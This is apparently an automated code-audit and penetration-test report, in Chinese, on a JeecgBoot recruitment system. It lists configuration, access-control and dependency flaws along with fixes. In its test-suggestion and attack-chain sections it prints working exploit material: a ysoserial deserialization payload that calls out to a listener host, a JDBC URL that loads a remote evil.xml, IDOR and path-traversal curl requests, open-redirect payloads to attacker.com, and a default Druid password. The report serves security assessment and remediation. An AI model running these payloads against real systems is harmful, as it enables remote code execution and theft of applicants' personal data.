# 信工所招聘系统 代码审计报告

## 审计范围

| 项目 | 内容 |
|------|------|
| 审计目标 | `jeecg-system-start-3.7.2.jar`（任意文件读取获取） |
| 框架版本 | JeecgBoot 3.7.2（定制版 `xgszp-boot`） |
| 运行时 | Java 1.8.0_371 / Tomcat 9.0.113 |
| 审计方法 | CFR 反编译 + 配置文件分析 + 依赖版本审查 |
| 关键模块 | `jeecg-module-recruitment-3.7.2.jar`（业务代码）、`jeecg-boot-base-core-3.7.2.jar`（基础框架）、各 `application-*.yml` |

---

## 一、配置文件审计（高价值发现）

### C-001：生产环境使用 dev profile — 安全配置大范围失效

**严重程度：严重 / CVSS 9.0**

`application.yml` 中硬编码 `spring.profiles.active: 'dev'`，导致加载 `application-dev.yml` 而非 `application-prod.yml`：

| 配置项 | dev 值 | prod 值 | 安全影响 |
|--------|--------|---------|----------|
| `knife4j.production` | `false` | `true` | Swagger 完全暴露（252 个端点） |
| `jeecg.firewall.lowCodeMode` | `dev` | `prod` | 在线开发功能全开 |
| `jeecg.jmreport.firewall.dataSourceSafe` | `false` | `true` | JimuReport 数据源无限制 |
| `jeecg.jmreport.firewall.lowCodeMode` | `dev` | `prod` | JimuReport 设计器全开 |
| `server.error.include-stacktrace` | `ALWAYS` | `ALWAYS` | 任意错误返回完整堆栈 |
| `mybatis.log-impl` | `StdOutImpl` | 关闭 | SQL 语句输出到日志 |

**这是 VULN-005（Swagger）、VULN-017/018（JimuReport SSRF/SQLi）、VULN-024 等漏洞存在的根本原因。**

**修复：** 部署时通过 JVM 参数或环境变量指定 profile：`-Dspring.profiles.active=prod`

---

### C-002：明文凭据硬编码在 JAR 包配置文件中

**严重程度：严重 / CVSS 9.8**

以下凭据存储在 JAR 包内的 `application-dev.yml` 和 `application-dev_backup.yml` 中，任何能读取 JAR 文件的人（已通过任意文件读取漏洞获取）即可直接获取：

| 凭据类型 | 值 | 影响 |
|----------|-----|------|
| **数据库密码** | `[已脱敏，历史曾硬编码]` | 直连生产数据库的口令曾泄露，须以环境变量注入并轮换 |
| **邮件服务密码** | `[已脱敏，历史曾硬编码]` | SMTP 密码曾泄露，须以环境变量注入并轮换 |
| **智谱AI API Key** | （历史曾硬编码于 yml，已移除；须 `AI_API_KEY` 注入并在控制台轮换） | 可消耗AI接口配额，可能泄露对话内容 |
| **X-Sign 密钥** | （Jeecg 默认已移除；生产须 `JEECG_SIGNATURE_SECRET`，与前端构建注入一致） | VULN-022：仓库内已清除泄露默认值，部署时轮换 |
| **Druid 口令** | `admin:123456` | 已在黑盒测试中确认（VULN-003） |

**注意：** 历史配置中曾出现外部数据库地址和明文凭据，可绕过应用层直连生产数据库。请立即核查该数据库是否真正对外暴露，并轮换凭据。

**修复：**
1. 立即更换所有泄露的凭据
2. 使用环境变量或 Vault 存储敏感配置，不得写入代码仓库/JAR
3. 数据库密码从 `application.yml` 改为 `${DB_PASSWORD}` 引用环境变量

---

### C-003：Shiro 过滤链配置缺陷 — `/jmreport/**` 完全放行

**严重程度：高危（代码确认）**

**修复（仓库已落地）：** `ShiroConfig.java` 将 `/jmreport/**`、`/drag/**` 配置为 `jwt,roles[admin]`；`/druid/**`、`/doc.html`、Swagger、`/actuator/**` 等为 `roles[admin]`。`jeecg.shiro.excludeUrls` 已与生产对齐，**禁止**包含 `jmreport` 子路径（历史曾含 `/jmreport/bigscreen2/**` 会在 Shiro 中优先匹配为 `anon`，从而绕过上述规则）。`ProdSecurityBindingValidator`（prod）启动时校验 `excludeUrls` 不得含 `jmreport`。

以下为审计时**旧版**反编译示例（仅作对比，当前代码已不如此配置）：

```java
// 旧版（已修复，勿恢复）
// filterChainDefinitionMap.put("/jmreport/**", "anon");
```

**原核心问题：** JimuReport 全路径若匿名放行，高危接口（如 `testConnection`、`queryFieldBySql`）将仅依赖框架自身校验；须配合 `lowCodeMode: prod`、`dataSourceSafe: true`（C-001）等防火墙配置。

---

### C-004：JWT Token 7天超长有效期

**严重程度：中危**

```yaml
# application-dev.yml
jeecg:
  security:
    token:
      expire-time: 604800000  # 毫秒 = 7天
```

一旦 Token 被盗（例如通过 VULN-010 的 Actuator httptrace），攻击者有 **7天** 的有效利用窗口。

**修复：** 建议 Token 有效期降至 2-8 小时，结合 Redis 实现主动吊销。

---

## 二、业务代码审计

### B-001：简历 IDOR — 全量列表接口无用户过滤（代码确认 VULN-002）

**位置：** `XgsResumeBaseController.java:queryPageList()`

```java
// 存在问题的 /list 接口（无任何用户过滤）
@GetMapping(value={"/list"})
public Result<IPage<XgsResumeBase>> queryPageList(...) {
    QueryWrapper queryWrapper = QueryGenerator.initQueryWrapper(xgsResumeBase, req.getParameterMap());
    // ⚠️ 无 queryWrapper.eq("create_by", currentUser.getUsername())
    IPage pageList = this.xgsResumeBaseService.page(page, queryWrapper);
    return Result.OK(pageList);
}

// 对比：正确实现的 /listMine 接口
@GetMapping(value={"/listMine"})
public Result<IPage<XgsResumeBase>> listMine(...) {
    LoginUser sysUser = (LoginUser)SecurityUtils.getSubject().getPrincipal();
    queryWrapper.eq("create_by", sysUser.getUsername()); // ✅ 正确过滤
    ...
}
```

开发者为 `listMine` 写了正确的过滤逻辑，但 `list` 接口作为"管理员接口"未在 Shiro 层加以限制，求职者（无权限角色）可直接调用获取全量 372 份简历 PII。

---

### B-002：简历编辑 IDOR — 无所有权校验（代码确认 VULN-020）

**位置：** `XgsResumeBaseController.java:edit()`

```java
@RequestMapping(value={"/edit"}, method={RequestMethod.PUT, RequestMethod.POST})
public Result<String> edit(@RequestBody XgsResumeBasePage xgsResumeBasePage) {
    XgsResumeBase xgsResumeBaseEntity = xgsResumeBaseService.getById(xgsResumeBase.getId());
    if (xgsResumeBaseEntity == null) {
        return Result.error("未找到对应数据");
    }
    // ⚠️ 仅检查记录是否存在，未校验 create_by == currentUser
    // 缺失：if (!xgsResumeBaseEntity.getCreateBy().equals(currentUser.getUsername())) return error
    this.xgsResumeBaseService.updateMain(xgsResumeBase, ...);
    return Result.OK("编辑成功!");
}
```

---

### B-003：简历 Word 导出 IDOR — **新发现漏洞**

**严重程度：高危 / CVSS 7.5**
**位置：** `XgsResumeExportController.java:exportResumeWord()`

```java
@GetMapping(value={"/exportResumeWord"})
public void exportResumeWord(
    @RequestParam(name="applyId", required=true) String applyId,
    HttpServletResponse response
) {
    // ⚠️ 无任何身份或所有权校验
    // 任何持有有效 JWT 的用户（包括 test-qz 求职者）可通过枚举 applyId 导出任意应聘者的完整简历 Word 文件
    this.exportService.exportResumeToWord(applyId, response);
}
```

Word 导出通常使用 `export_template_PT.docx` / `export_template_BSH.docx` 等模板，会填充完整 PII（姓名、身份证、学历、工作经历等）。结合 VULN-009（岗位申请列表可获取 applyId）可批量导出全部应聘者简历。

**验证建议：**
```bash
# 获取任意 applyId（从岗位申请列表）
curl -H "X-Access-Token: <test-qz-token>" \
  "http://10.28.12.15/xgszp-boot/positions/xgsPositionApply/list"

# 导出他人简历 Word
curl -H "X-Access-Token: <test-qz-token>" \
  "http://10.28.12.15/xgszp-boot/xgsExport/exportResumeWord?applyId=<id>" \
  -o resume.docx
```

**修复：**
```java
// 添加所有权校验
LoginUser sysUser = (LoginUser)SecurityUtils.getSubject().getPrincipal();
XgsPositionApply apply = positionApplyService.getById(applyId);
if (!sysUser.getId().equals(apply.getCreateBy()) && !isAdminRole(sysUser)) {
    response.sendError(403, "无权访问");
    return;
}
```

---

### B-004：岗位申请列表 — 无权限分级（新关注点）

**位置：** `XgsPositionApplyController.java:queryPageList()`

```java
@GetMapping(value={"/list"})
public Result<IPage<XgsPositionApply>> queryPageList(...) {
    // 仅通过 approvalNode 参数进行逻辑分支，无角色鉴权
    // 任何传递合法 JWT 的用户可通过不传 approvalNode 获取所有申请记录
    if ("部门审核".equals(approvalNode)) { ... }
    else if ("人力处审核".equals(approvalNode)) { ... }
    else {
        // ⚠️ 落入 else，pageList 为 null，但前序代码的 QueryWrapper 未添加 create_by 过滤
        log.warn("未识别的审批环节: {}", approvalNode);
    }
    return Result.OK(pageList); // 若 pageList=null 则返回 null，否则返回全量数据
}
```

**建议验证：** 不传 `approvalNode` 参数，观察是否返回全量岗位申请记录（含其他求职者的申请状态）。

---

### B-005：调试接口未清理

**位置：** `XgsResumeExportController.java:testTemplates()`

```java
@GetMapping(value={"/testTemplates"})
public Result<?> testTemplates() {
    // 遍历并检测所有 Word 模板文件的状态
    // 暴露：模板文件路径、文件大小、格式信息、classpath 资源存在性
    ...
}
```

**访问路径：** `GET /xgszp-boot/xgsExport/testTemplates`（需 JWT Token）

**修复：** 删除该调试接口，或加 `@Profile("dev")` 注解。

---

### B-006：AI 聊天接口 API Key 硬编码泄露

**位置：** `application-dev.yml`，`ChatController.java`

**修复（仓库已落地）：** `jeecg.ai-chat.apiKey` / `apiHost` 改为 `${AI_API_KEY:}`、`${AI_API_HOST:...}`；启用 AI 且未配置密钥时启动失败（`AiChatAutoConfiguration`）；须在智谱控制台轮换曾泄露的 Key。

```yaml
jeecg:
  ai-chat:
    enabled: ${AI_CHAT_ENABLED:false}  # dev 默认关闭；需 AI 时设为 true 并配置 AI_API_KEY
    apiKey: ${AI_API_KEY:}
    apiHost: ${AI_API_HOST:https://open.bigmodel.cn/api/paas/v4/}
```

该 API Key 可用于：
1. 消耗系统的 AI 接口配额（产生费用）
2. 若聊天历史存储在智谱AI平台，可能泄露内部对话内容

**接口：** `GET /xgszp-boot/test/ai/chat/send?message=xxx`（Shiro 层通过特殊方式注册为受保护）

---

## 三、依赖组件已知漏洞分析

### D-001：Apache Shiro 1.12.0 — CVE-2023-46750

**严重程度：中危 / CVSS 6.1**

Shiro 1.12.0 受 CVE-2023-46750（Open Redirect，修复于 1.13.0）影响。攻击者可构造特殊 URL 将用户重定向到恶意站点，可用于钓鱼攻击。

**测试 payload：**
```
http://10.28.12.15/xgszp-boot/;URL=//attacker.com
```

---

### D-002：SnakeYAML 1.30 — CVE-2022-1471（反序列化）

**严重程度：高危 / CVSS 9.8（上下文依赖）**

SnakeYAML 1.30 受 CVE-2022-1471 影响，通过 `!!` 语法可触发任意类实例化导致 RCE。该漏洞在 2.0 版本修复。

**修复（仓库已落地）：** `jeecg-boot/pom.xml` 中覆盖 **`snakeyaml.version` 为 2.2**，并 **`spring-framework.version` 为 5.3.39**（5.3 线安全补丁，与 SnakeYAML 2.x 运行时兼容）。全模块继承父 POM 后依赖树中 `org.yaml:snakeyaml` 应解析为 2.2。

**关键问题：** 系统是否存在接受 YAML 格式用户输入的接口？

**建议验证点：**
- 任何接受 Content-Type: application/yaml 的接口
- 富文本编辑器、导入功能中可能间接处理 YAML
- Swagger 接口描述中若有 YAML 解析路径

---

### D-003：JimuReport 1.9.1 — 已知漏洞列表

JimuReport 1.9.x 存在多个公开漏洞，结合系统当前 `lowCodeMode: dev` 状态（C-001）影响被放大：

| CVE/编号 | 类型 | 影响 |
|----------|------|------|
| CNVD-2023-12552 | SQL 注入 | 已在黑盒测试中确认（VULN-018） |
| CNVD-2023-XXXXX | SSRF | 已在黑盒测试中确认（VULN-017） |
| CVE-2024-34444 | RCE via JDBC | 与 VULN-017 攻击链重叠 |
| JimuReport OGNL 注入 | RCE | 报表配置中若可注入 OGNL 表达式 |

---

### D-004：Commons Collections 3.2.2 / 4.4 — 反序列化 Gadget Chain

**注意：** 这两个库本身不是漏洞，但确认了以下 gadget chains 在 classpath 中存在：

| Gadget Chain | 状态 |
|---|---|
| CC1 (TransformedMap) | 可用（CC 3.2.2） |
| CC5 (BadAttributeValueExpException) | **已部分触发**（VULN-017 测试中） |
| CC6 (HashSet+TiedMapEntry) | 可用 |
| CC7 (Hashtable) | 可用 |
| CC2/CC4 (PriorityQueue) | 可用（CC4 4.4） |
| CB1 (BeanComparator) | 可用（commons-beanutils 1.9.4） |
| Spring1/Spring2 | 可用（Spring 5.3.31） |

这些 gadget chains 的可利用性取决于反序列化入口，当前最有可能的入口是 VULN-017（JDBC 反序列化）。

---

### D-005：fastjson 1.2.83 — 安全状态

fastjson 1.2.83 是截至 2022 年的最新安全版本，针对已知 autoType 绕过均已修复。在默认配置（不开启 autoType）下基本安全。

**建议：** 升级到 2.x 系列（完全重写，安全性更高）。

---

## 四、未覆盖的黑盒测试建议

结合代码审计发现，以下方向在黑盒测试中尚未覆盖或需要深入：

### 优先级 P0（高回报率）

**① B-003 — Word 导出 IDOR（已明确漏洞，待验证）**
```bash
curl -H "X-Access-Token: <test-qz-token>" \
  "http://10.28.12.15/xgszp-boot/xgsExport/exportResumeWord?applyId=<any-apply-id>"
```
预期：返回其他用户的完整简历 Word 文档

**② C-002 — 直连外部数据库（需外部网络确认）**
```bash
mysql -h <db-host> -P <db-port> -u <db-user> -p'<rotated-password>' <db-name>
```
若该数据库真正对外暴露，可直接 SQL dump 全量数据（规避所有应用层认证）

**③ VULN-017 继续推进 — JDBC 反序列化 RCE**

根据 `jdbc-deser-handoff.md` 的分析，CC5 有部分触发迹象。建议：

- **方案A - 更换更多 gadget chain**：目标有 `commons-collections-3.2.2.jar` + `4.4.jar`，CC6/CC7 在 JDK 8 上兼容性更好
  ```
  # 用 CC6 替换 CC5 重试
  java -jar ysoserial-all.jar CommonsCollections6 "curl http://192.168.115.203:10002/cc6-rce" > /tmp/cc6.ser
  ```

- **方案B - PostgreSQL socketFactory 路径**：
  ```json
  {
    "dbUrl": "jdbc:postgresql://111.198.53.163:10001/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://192.168.115.203:10002/evil.xml",
    "dbDriver": "org.postgresql.Driver"
  }
  ```
  PostgreSQL 42.2.25 中 `socketFactory` 参数接受一个 String 参数的构造函数，ClassPathXmlApplicationContext(String) 符合此条件，可加载远程 Spring XML 配置文件执行命令

- **方案C - 通过 /sys/dataSource/add 注册恶意数据源后触发 queryFieldBySql**：
  注册含 `autoDeserialize=true` 的数据源后，用 `dbKey` 参数让 `queryFieldBySql` 使用该数据源建立连接

### 优先级 P1

**④ VULN-010 深挖 — Actuator httptrace 获取管理员 Token**
```bash
curl -H "X-Access-Token: <test-qz-token>" \
  "http://10.28.12.15/xgszp-boot/actuator/jeecghttptrace/recent?limit=100"
```
若管理员 admin/hradmin 最近登录，其 Token 可能出现在 trace 记录中，7天有效期（C-004）提供了足够的时间窗口

**⑤ 岗位申请全量泄露验证（B-004）**
```bash
# 不传 approvalNode，直接 /list
curl -H "X-Access-Token: <test-qz-token>" \
  "http://10.28.12.15/xgszp-boot/positions/xgsPositionApply/list?pageSize=100"
```

**⑥ Shiro 认证绕过（CVE-2023-46750）**
```bash
curl "http://10.28.12.15/xgszp-boot/sys/user/list;URL=//attacker.com"
curl "http://10.28.12.15/xgszp-boot/%2F..%2Fsys/user/list"
```

**⑦ SnakeYAML 注入探测（C-002/D-002）**

排查是否有 YAML 格式的配置导入接口，重点关注：
- Excel/JSON 导入功能中的特殊字段
- 报表配置的自定义参数解析

**⑧ 简历 AI 分析接口**

`XgsUserResumeFileController.analysisResume()` 调用了 AI 分析简历文件，入参为 `XgsUserResumeFile`（含文件路径）。需验证：
- 文件路径是否有路径穿越校验
- AI 解析过程是否会执行文件中的宏/脚本
```bash
curl -X POST -H "X-Access-Token: <test-qz-token>" \
  -H "Content-Type: application/json" \
  -d '{"filePath":"../application-dev.yml"}' \
  "http://10.28.12.15/xgszp-boot/resume/xgsUserResumeFile/analysisResume"
```

---

## 五、新增漏洞汇总

| ID | 漏洞名称 | 严重程度 | CVSS | 来源 |
|----|----------|----------|------|------|
| C-001 | 生产环境使用 dev profile — 安全配置大范围失效 | **严重** | 9.0 | 配置审计 |
| C-002 | JAR 包配置文件明文凭据（DB/邮件/AI Key） | **严重** | 9.8 | 配置审计 |
| C-003 | Shiro 过滤链 `/jmreport/**` 完全放行 | **高危** | 8.5 | 代码审计 |
| C-004 | JWT Token 7天超长有效期 | **中危** | 5.3 | 配置审计 |
| B-003 | 简历 Word 导出 IDOR — 任意用户导出他人简历 | **高危** | 7.5 | 代码审计（待验证） |
| B-004 | 岗位申请全量列表无权限分级 | **高危** | 7.1 | 代码审计（待验证） |
| B-005 | 调试接口未清理（/testTemplates） | **低危** | 3.5 | 代码审计 |
| B-006 | AI API Key 硬编码泄露 | **中危** | 5.3 | 配置审计 |
| D-001 | Shiro 1.12.0 — CVE-2023-46750 开放重定向 | **中危** | 6.1 | 依赖分析 |
| D-002 | SnakeYAML — CVE-2022-1471 反序列化（依赖已升 2.2） | **高危** | 9.8（上下文依赖） | 依赖分析 |

---

## 六、与黑盒测试结合的综合攻击链分析

### 攻击链 A：低权限 → 数据库 RCE（最高价值路径）

```
1. 注册/登录求职者账号（test-qz）
2. [VULN-017] POST /jmreport/testConnection → 建立到攻击者 Rogue MySQL 的出站连接
3. [JDBC 反序列化] 选用 CC6/Spring gadget chain → RCE
4. [备选] MySQL 凭据（C-002）直连 111.198.53.163:18333 绕过应用层

现状：步骤 2 已验证，步骤 3 待完成（CC5 有触发迹象）
```

### 攻击链 B：低权限 → 管理员 Token（横向越权）

```
1. [VULN-010] GET /actuator/jeecghttptrace → 获取管理员登录的 HTTP 请求记录
2. [C-004] JWT 7天有效期 → 获取的 Token 长期可用
3. 使用管理员 Token 访问任意管理接口
4. [VULN-023] 修改 Quartz 定时任务类 → 指向自定义恶意 Job → RCE

现状：步骤 1 需要管理员最近登录，步骤 3-4 需管理员权限确认
```

### 攻击链 C：零认证 → 全量 PII 泄露（已完全实现）

```
1. 无认证 → [VULN-009] 获取岗位、组织架构信息
2. 求职者账号 → [VULN-001] 937 个用户 PII（含管理员）
3. 求职者账号 → [VULN-002] 372 份简历（身份证号等敏感 PII）
4. 求职者账号 → [B-003] 下载任意应聘者 Word 简历文件

现状：完全实现
```

---

## 七、修复优先级

### P0 — 立即处理（24小时内）

1. **更换所有泄露凭据**（C-002）：数据库密码、邮件密码、AI Key、X-Sign Secret
2. **确认并修复 profile 配置**（C-001）：`-Dspring.profiles.active=prod` 或在部署脚本中设置
3. **封堵外部数据库直连**：核查 `111.198.53.163:18333` 是否对外暴露，立即加白名单

### P1 — 本周内（见黑盒报告 P0/P1 建议）

4. **禁用/移除 JimuReport 危险端点**（VULN-017/018）
5. **修复简历 Word 导出 IDOR**（B-003）：添加所有权校验
6. **修复简历列表/编辑 IDOR**（VULN-002/020）：代码层添加 `create_by` 过滤

### P2 — 两周内

7. **升级 Shiro 到 1.13.0+**（D-001）
8. ~~**升级 SnakeYAML 到 2.0+**（D-002）~~ 已覆盖为 2.2（父 POM）
9. **删除调试接口**（B-005）：`/xgsExport/testTemplates`
10. **缩短 JWT 有效期**（C-004）：建议 8 小时以内
11. **Shiro 过滤链收紧**（C-003）：`/druid/**` 改为 `authc`（或直接禁用），`/jmreport/**` 限制为管理员角色

---

*审计日期：2026-03-13*
*审计人：自动化代码审计（CFR 反编译 + 配置分析）*
